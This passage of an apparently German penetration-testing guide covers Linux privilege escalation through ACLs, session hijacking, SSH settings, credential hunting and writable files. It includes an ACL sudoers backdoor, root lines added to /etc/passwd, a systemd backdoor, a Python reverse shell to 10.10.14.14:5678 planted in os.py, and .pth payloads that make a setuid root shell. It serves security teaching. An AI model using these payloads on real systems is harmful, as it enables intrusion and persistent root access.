int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Fähigkeiten

Linux-Capabilities stellen einem Prozess eine **Teilmenge der verfügbaren Root-Berechtigungen bereit**. Dadurch werden Root-**Berechtigungen in kleinere, voneinander unabhängige Einheiten aufgeteilt**. Jede dieser Einheiten kann Prozessen unabhängig gewährt werden. Auf diese Weise wird der vollständige Satz an Berechtigungen reduziert, wodurch das Exploit-Risiko sinkt.\
Lies die folgende Seite, um **mehr über Capabilities und deren Missbrauch zu erfahren**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für „Ausführen“**, dass der betroffene Benutzer mit „**cd**“ in den Ordner wechseln kann.\
Das **Bit „Lesen“** bedeutet, dass der Benutzer die **Dateien** auflisten kann, und das **Bit „Schreiben“** bedeutet, dass der Benutzer neue **Dateien** **löschen** und **erstellen** kann.

## ACLs

Access Control Lists (ACLs) bilden die zweite Ebene der diskretionären Berechtigungen und können die herkömmlichen ugo/rwx-Berechtigungen **außer Kraft setzen**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Diese **Granularität ermöglicht eine präzisere Zugriffsverwaltung**. Weitere Informationen findest du [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Gewähre** dem Benutzer „kali“ Lese- und Schreibberechtigungen für eine Datei:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Dateien mit bestimmten ACLs vom System abrufen:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Versteckte ACL-Backdoor in sudoers-Drop-ins

Eine häufige Fehlkonfiguration ist eine root-eigene Datei in `/etc/sudoers.d/` mit dem Modus `440`, die einem Benutzer mit niedrigen Rechten dennoch über ACL Schreibzugriff gewährt.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Wenn du etwas wie `user:alice:rw-` siehst, kann der Benutzer trotz restriktiver Modusbits eine sudo-Regel hinzufügen:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Dies ist ein Pfad zur Persistenz/Privilegieneskalation über ACLs mit hohem Risiko, da er bei Prüfungen, die sich nur auf `ls -l` stützen, leicht übersehen wird.

## Offene Shell-Sitzungen

Der sitzungsübergreifende GNU-Screen-Zugriff hängt von der **Konfiguration und ACL der laufenden Sitzung** ab, nicht allein von der Version. [GNU Screen dokumentiert](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html), dass es mit Multiuser-Unterstützung erstellt worden sein muss; `multiuser on` und eine Berechtigung über `acladd` oder ein geeignetes `aclchg` ermöglichen einem anderen Benutzer das Anhängen. [Laut Handbuch ist außerdem setuid-root erforderlich](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html), damit sitzungsübergreifende Sitzungen gefunden werden können. Ein sichtbarer Socket im Besitz von root oder allein eine SUID-`screen`-Binärdatei belegt nicht, dass eine anhängbare root shell verfügbar ist. Bevor du dies als Privilegieneskalation einstufst, bestätige, dass die aktive Sitzung im Multiuser-Modus läuft, der aktuelle Benutzer über effektive Eingabe-/Befehlsberechtigungen verfügt und die Shell in dieser Sitzung als privilegierter Besitzer läuft.

### screen sessions hijacking

**Screen-Sitzungen auflisten**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - Socket-Standorte (manche Systeme stellen eine davon als Symlink der anderen bereit): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**An eine Sitzung anhängen**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## Hijacking von tmux-Sessions

Dies war ein Problem bei **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux-Sitzung (v2.1) nicht als nicht privilegierter Benutzer hijacken.

**tmux-Sitzungen auflisten**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Socket-Speicherorte (manche Systeme stellen einen als Symlink des anderen bereit) – Hijacking von tmux-Sitzungen: tmux -S /tmp/dev sess ls Mit diesem Socket auflisten; du kannst eine tmux-Sitzung in diesem Socket starten...](<../../images/image (837).png>)

**An eine Sitzung anhängen**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Prüfen Sie **Valentine box from HTB** als Beispiel.

## SSH

### Vorhersehbarer OpenSSL-PRNG unter Debian – CVE-2008-0166

Mit betroffenen Debian- oder abgeleiteten OpenSSL-Builds während des historischen Schwachstellenzeitraums generierte Schlüssel können vorhersehbare Zufallswerte enthalten; die aktuelle Distribution des Hosts oder eine gepatchte OpenSSL-Version belegt nicht, wie ein älterer Schlüssel generiert wurde. Prüfen Sie den **konkreten Schlüssel** anhand einer geeigneten historischen Blacklist und seiner Herkunft. Das Debian-[`ssh-vulnkey`-Handbuch](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) beschreibt die Prüfung öffentlicher Schlüssel und von `authorized_keys`; [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) dokumentiert den OpenSSL-Fix. Ein Eintrag in der `authorized_keys`-Datei eines privilegierten Kontos ist nur dann ein Ansatzpunkt zur Rechteausweitung, wenn der zugehörige private Schlüssel wiederhergestellt werden kann und die effektive SSH-Richtlinie diesen Schlüssel für das Konto weiterhin akzeptiert; ein schwacher **Host**-Schlüssel ist selbst kein Anmeldezugang. Ersetzen Sie kompromittierte Schlüssel und entfernen Sie ihre alten Autorisierungen.

### Interessante SSH-Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob Passwortauthentifizierung zulässig ist. Der OpenSSH-Standardwert des Upstream-Projekts ist `yes`; die Distributionskonfiguration kann ihn überschreiben.
- **PubkeyAuthentication:** Gibt an, ob die Authentifizierung mit öffentlichen Schlüsseln zulässig ist. Der Standardwert ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwortauthentifizierung zulässig ist, gibt diese Option an, ob der Server die Anmeldung bei Konten mit leeren Passwortzeichenfolgen erlaubt. Der Standardwert ist `no`.

### Dateien zur Anmeldekontrolle

Diese Dateien beeinflussen, wer sich anmelden kann und auf welche Weise:

- **`/etc/nologin`**: Wenn vorhanden, blockiert die Datei Anmeldungen von Nicht-root-Benutzern und gibt ihre Meldung aus.
- **`/etc/securetty`**: Beschränkt, wo sich root anmelden kann (TTY-Allowlist).
- **`/etc/motd`**: Banner nach der Anmeldung (kann Umgebungs- oder Wartungsdetails leaken).

### PermitRootLogin

Gibt an, ob sich root über ssh anmelden kann. Der OpenSSH-Standardwert des Upstream-Projekts ist `prohibit-password`; die Distributionskonfiguration kann ihn überschreiben. Mögliche Werte:

- `yes`: root kann sich mit Passwort und privatem Schlüssel anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: root kann sich nur mit einem privaten Schlüssel anmelden, wenn die Optionen für Befehle angegeben sind
- `no` : nein

### Vertrauenswürdige SSH-Benutzerzertifizierungsstellen

`TrustedUserCAKeys` benennt öffentliche Schlüssel, denen sshd das Signieren von **Benutzer**zertifikaten anvertraut. Wenn der entsprechende private CA-Schlüssel für einen Benutzer mit geringeren Rechten lesbar ist, prüfen Sie, wer ein Zertifikat erhalten kann und für welche Kontoprincipals es zur Authentifizierung verwendet werden könnte. `AuthorizedPrincipalsFile` oder `AuthorizedPrincipalsCommand` können die akzeptierten Namen beschränken; wenn keines von beiden konfiguriert ist, muss das Zertifikat den Namen des Zielkontos enthalten. `PermitRootLogin prohibit-password` blockiert die Passwortauthentifizierung für root, kann aber weiterhin die Zertifikatauthentifizierung erlauben. Ein offengelegter Schlüsselpfad allein belegt keinen Zugriff: Prüfen Sie das öffentliche/private Schlüsselpaar, die effektiven `Match`-Regeln, die Kontorichtlinie, die Schlüsselpassphrase, den Widerruf und die akzeptierten Signaturalgorithmen. Geben Sie bei der Aufzählung keine privaten Schlüsselbytes aus. Siehe das [OpenSSH-Handbuch zur Serverkonfiguration](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Ein privater CA-Schlüssel kann auch **ohne Lesbarkeit** für den aktuellen Benutzer verwendbar sein, wenn eine Regel zur Privilegienübertragung diesem Benutzer erlaubt, einen uneingeschränkten [Zertifikatsignierer wie `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) unter der Identität des Schlüsselbesitzers aufzurufen. Gleichen Sie den exakt erlaubten Befehl und seine Argumente mit dem Zugriff des Signierkontos auf den Schlüssel, der von der effektiven sshd-Konfiguration vertrauten öffentlichen CA, dem für das Zielkonto akzeptierten Principal, der Zertifikatsgültigkeit und der Anmelderichtlinie dieses Kontos ab. Ein delegierter Signierbefehl oder eine vertrauenswürdige CA-Datei allein belegt keinen Zugriff auf ein anderes Konto; signieren Sie bei der passiven Aufzählung kein Testzertifikat.

Informationen zum separaten CA-Vertrauenspfad pro Konto finden Sie unter [Verwechslung von SSH-Zertifikats-Principal-Trennzeichen](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Gibt Dateien an, die öffentliche Schlüssel enthalten, die für die Benutzerauthentifizierung verwendet werden können. Sie können Token wie `%h` enthalten, das durch das Home-Verzeichnis ersetzt wird. **Sie können absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers aus**. Zum Beispiel:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Diese Konfiguration gibt an, dass ssh beim Anmeldeversuch mit dem **privaten** Schlüssel des Benutzers "**testusername**" den öffentlichen Schlüssel deines Schlüssels mit denen unter `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht.

### ForwardAgent/AllowAgentForwarding

SSH-Agent-Weiterleitung ermöglicht es dir, **deine lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrasen!) auf deinem Server abzulegen. So kannst du dich per ssh **mit einem Host verbinden** und von dort aus **mit dem Schlüssel** auf deinem **ursprünglichen Host** **eine Verbindung zu einem weiteren Host herstellen**.

Du musst diese Option in `$HOME/.ssh.config` wie folgt festlegen:

```
Host example.com
  ForwardAgent yes
```

Beachte, dass bei `Host` mit dem Wert `*` jeder Host auf die Schlüssel zugreifen kann, sobald der Benutzer zu einem anderen Computer wechselt (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verbieten.\
Die Datei `/etc/sshd_config` kann SSH-Agent-Forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verbieten** (Standard ist „erlaubt“).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, denn **du kannst es möglicherweise missbrauchen, um deine Privilegien auszuweiten**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Wenn du also **eine davon schreiben oder ändern kannst, kannst du deine Privilegien ausweiten**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Informationen** überprüfen.

### Passwd-/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` anders benannt sein oder es kann eine Sicherungskopie geben. Daher wird empfohlen, **alle zu finden** und zu **prüfen, ob du sie lesen kannst**, um festzustellen, **ob die Dateien Hashes enthalten**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

In manchen Fällen findest du **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei).

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Beschreibbare /etc/passwd

Generiere zunächst mit einem der folgenden Befehle ein Passwort.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Füge dann den Benutzer `hacker` hinzu und setze das generierte Passwort.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden.

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die aktuelle Sicherheit des Rechners beeinträchtigt werden.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` in `/etc/pwd.db` und `/etc/master.passwd`; außerdem wird `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du **in einige sensible Dateien schreiben** kannst. Kannst du zum Beispiel in eine **Dienst-Konfigurationsdatei** schreiben?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Wenn auf dem Rechner beispielsweise ein **tomcat**-Server läuft und du die **Tomcat-Dienstkonfigurationsdatei in /etc/systemd/ ändern kannst,** kannst du die Zeilen ändern:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Deine Backdoor wird ausgeführt, wenn Tomcat das nächste Mal gestartet wird.

### Ordner überprüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Auf den letzten wirst du wahrscheinlich nicht zugreifen können, aber versuche es.)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Ungewöhnlicher Speicherort/eigene Dateien

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### In den letzten Minuten geänderte Dateien

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### SQLite-Datenbankdateien

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

Forensische lesbare Anwendungsdatenbanken, prüfe Tabellen- und Spaltennamen auf Benutzernamen und Passwort-Hashes. Einen Hash zu finden, das zugehörige Passwort wiederherzustellen und dessen Wiederverwendung für ein lokales Konto nachzuweisen, sind separate Schritte; eine generische 32-stellige hexadezimale Zeichenfolge reicht nicht aus, um auf MD5 oder Kontozugriff zu schließen.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml-Dateien

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Wenn ein lesbarer Shell-Verlauf einen `sudo`-Befehl gefolgt von einer kurzen, passwortähnlichen Zeile enthält, prüfe die umgebenden Zeilen manuell. Ein in die normale `sudo`-Eingabeaufforderung eingegebenes Passwort wird nicht im Shell-Verlauf gespeichert; eine nachfolgende Zeile ist lediglich eine mögliche versehentliche Shell-Eingabe und kein Beweis für ein gültiges Passwort. Der Marker `.sudo_as_admin_successful` protokolliert eine frühere Verwendung, nicht die aktuelle Berechtigung.

### Versteckte Dateien

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skripte/Programme in PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Webdateien**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Backups**

Prüfe lesbare Dateien in Backup-Verzeichnissen ebenso wie Dateien, deren **Namen** `backup` enthalten: Ein Archiv mit einem nichtssagenden Namen oder einer verschlüsselten Dateiendung kann dennoch alte Anwendungsdaten offenlegen. Ein verschlüsseltes Archiv ist lediglich ein möglicher Fund. Die Wiederherstellung des Passworts, die Prüfung des Inhalts, die Wiederherstellung eines Anwendungshashs und die Wiederverwendung dieses Passworts für ein Unix-Konto sind separate Schritte, die jeweils überprüft werden müssen; ein Hash in einem Archiv belegt keinen lokalen Login.

Lesbare Backups virtueller Maschinen sollten ebenso geprüft werden. Eine VirtualBox-Konfiguration im Format `.vbox` kann angehängte `.vdi`-Images identifizieren und Metadaten zu verschlüsselten Festplattenschlüsseln enthalten; [VirtualBox dokumentiert, dass der verschlüsselte Datenschlüssel in der VM-Konfiguration gespeichert wird](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Sowohl die Konfiguration als auch das Image müssen zugänglich sein, bevor eine Offline-Prüfung des Datenträgers möglich ist. Ein Gast-Volume kann über eine eigene [LUKS-Verschlüsselungsebene](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc) verfügen, für die ein separater Schlüssel erforderlich ist. Selbst nach einer autorisierten Entschlüsselung können alte Skripte oder Konfigurationen ein Passwort enthalten. Stelle fest, ob die Zugangsdaten für ein Host-Konto aktuell sind und ob dessen wirksame `sudo`-Richtlinie einen privilegierten Befehl erlaubt, bevor du dies als lokale Rechteausweitung bezeichnest. Erfasse bei einer passiven Bestandsaufnahme Pfade und Berechtigungen, ohne Images zu kopieren, zu entschlüsseln oder einzuhängen.

Führe beim Prüfen eines lesbaren Archivs zuerst die Namen der enthaltenen Dateien auf, bevor du etwas extrahierst: Es könnten versteckte Authenticator-Dateien, Material mit Wiederherstellungscodes oder SSH-Schlüssel enthalten sein, selbst wenn die aktiven Kopien geschützt sind. Dateinamen weisen lediglich auf eine mögliche Spur hin; überprüfe das Material und eine etwaige Wiederverwendung von Konten separat.

Priorisiere **lesbare Archive, die einem anderen Benutzer gehören** und sich in Backup-Verzeichnissen befinden, insbesondere root-eigene Archive und solche, die über eine Gruppenmitgliedschaft zugänglich sind. Ein altes Archiv kann eine Konfiguration oder ein Authentifizierungsgeheimnis enthalten, selbst wenn die aktive Kopie geschützt ist. Prüfe bei einer lokalen Backup-Benutzeroberfläche wie [Backrest](https://garethgeorge.github.io/backrest/) das effektive Konto des Dienstes und ob ein Benutzer mit geringeren Rechten dessen Konfiguration lesen oder sich bei der Benutzeroberfläche authentifizieren kann. Die [Hooks](https://garethgeorge.github.io/backrest/docs/hooks) und die [restic-Befehlsschnittstelle](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) können mit den Datei- und Befehlsberechtigungen des Daemons arbeiten; ein Loopback-Listener allein bestimmt nicht die Auswirkungen. Backrests `passwordBcrypt` ist ein Base64-kodierter bcrypt-Hash im [Authentifizierungscode](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), kein Klartextpasswort. Prüfe die Dienstidentität, verwendbare Zugangsdaten und den Zugriff auf den betreffenden Plan oder das Repository, bevor du ein offengelegtes Archiv oder eine Benutzeroberfläche als Rechtebarriere einstufst.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Bekannte Dateien mit Passwörtern

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): Das Tool sucht nach **verschiedenen möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, mit der sich zahlreiche Passwörter abrufen lassen, die lokal auf einem Windows-, Linux- oder Mac-Computer gespeichert sind.

Wenn `/etc/guacamole/guacamole.properties` lesbar ist, prüfe die Datenbankverbindungseinstellungen `mysql-*`, `postgresql-*` oder `sqlserver-*`. Wenn das Konto berechtigt ist, die Guacamole-JDBC-Tabellen zu lesen, kann `guacamole_connection_parameter` gespeicherte SSH-Werte für `username`, `password`, `private-key` oder `passphrase` enthalten. Beginne mit Verbindungs-IDs und Parameternamen und prüfe anschließend nur relevante Zeilen. Ein gespeicherter Wert kann ein dynamisches Token oder ein Verweis auf einen Vault sein und muss kein wiederverwendbares Geheimnis darstellen. Siehe das [Guacamole-JDBC-Schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) und die [SSH-Verbindungsparameter](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

Der [Standard-Datenspeicher von pswm](https://github.com/Julynx/pswm#usage) enthält standardmäßig einen verschlüsselten Vault unter `~/.local/share/pswm/pswm`. Wenn der Vault eines anderen Benutzers sichtbar ist, prüfe dessen Eigentümer und ob dein Konto ihn tatsächlich lesen kann. Der Pfad zum Vault allein gibt keine Zugangsdaten preis. Das Wiederherstellen des Master-Passworts, das Finden eines wiederverwendbaren Kontopassworts und das Überprüfen der Berechtigungen dieses Kontos sind separate Schritte.

Die [Standarddatenbank von Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) befindet sich unter `~/.passpie/` und umfasst einen Schlüsselbund `.keys` sowie verschlüsselte Zugangsdatendateien `.pass` in Gruppenverzeichnissen. Ein sichtbares Datenbankverzeichnis ist lediglich ein Hinweis auf einen möglichen Pfad: Prüfe den Zugriff auf den Schlüssel und den relevanten verschlüsselten Eintrag, eine gegebenenfalls erforderliche Master-Passphrase und ob die wiederhergestellten Zugangsdaten zu einem Konto mit höheren Berechtigungen gehören. Passpie unterstützt außerdem [benutzerdefinierte Datenbankpfade](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), daher deckt der Standardpfad nicht alle Möglichkeiten ab. Die automatisierte Aufzählung sollte Metadaten auflisten, ohne Zugangsdaten zu exportieren oder Schlüsselmaterial auszugeben.

### Protokolle

Wenn du Protokolle lesen kannst, findest du darin möglicherweise **interessante/vertrauliche Informationen**. Je seltsamer das Protokoll ist, desto interessanter ist es vermutlich.\
Außerdem können manche „**schlecht**“ konfigurierten (manipulierten?) **Audit-Protokolle** es ermöglichen, **Passwörter in Audit-Protokollen aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Um **Protokolle lesen zu können, ist die Gruppe** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Generische Suche nach Zugangsdaten/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Dateinamen** oder im **Inhalt** enthalten. Suche auch in Logs nach IPs und E-Mail-Adressen sowie mit Regex nach Hashes.\
Ich werde hier nicht alle Methoden dafür auflisten. Wenn du dich dafür interessierst, kannst du dir die letzten Prüfungen ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchführt.

## Beschreibbare Dateien

### Python library hijacking

Wenn du weißt, **wo** ein Python-Skript ausgeführt wird, und du **in diesen Ordner schreiben** oder Python-Bibliotheken **modifizieren kannst**, kannst du die OS-Bibliothek ändern und mit einer Backdoor versehen (wenn du in den Ordner schreiben kannst, in dem das Python-Skript ausgeführt wird, kopiere die Bibliothek os.py dorthin).

Um die Bibliothek **mit einer Backdoor zu versehen**, füge einfach die folgende Zeile am Ende der Bibliothek os.py ein (ändere IP und PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Beschreibbare `.pth`-Datei, die von `site.addsitedir()` verarbeitet wird

Behandle `site.addsitedir(DIR)` nicht als gleichbedeutend mit `sys.path.append(DIR)`. Die Funktion verarbeitet außerdem jede `*.pth`-Datei in `DIR`. Eine Zeile, die mit `import` gefolgt von einem Leerzeichen oder Tabulator beginnt, wird als Python-Code ausgeführt. Pfadzeilen werden dagegen relativ zum Site-Verzeichnis aufgelöst und nur hinzugefügt, wenn die Pfade existieren.<sup>[[38]](#references)</sup>

Dies führt zu einer Privilegieneskalation, wenn ein mit `sudo` erlaubtes oder anderweitig privilegiertes Python-Programm `site.addsitedir()` für ein Verzeichnis aufruft, das für den aktuellen Benutzer oder eine seiner Gruppen beschreibbar ist. Der Code in der `.pth`-Datei wird ausgeführt, während das privilegierte Programm seinen Importpfad einrichtet, bevor seine eigentliche Aktion gestartet wird.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Ausführbarer `.pth`-Inhalt muss in eine Zeile passen, aber Semikolons ermöglichen mehrere Anweisungen. Beispielsweise kann ein Ausführungspfad als Root eine setuid-Kopie von Bash erstellen; rufe Bash mit `-p` auf, damit die effektive ID erhalten bleibt.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Die Option `-S` deaktiviert lediglich die automatische `site`-Initialisierung von Python. Sie schützt kein Programm, das `site` explizit importiert und `site.addsitedir()` aufruft. Entferne angreiferkontrollierte Verzeichnisse aus privilegierten Importpfaden und stelle sicher, dass das Verzeichnis und seine `.pth`-Dateien dem privilegierten Administrator gehören und nur von ihm beschreibbar sind.<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate-Ausnutzung

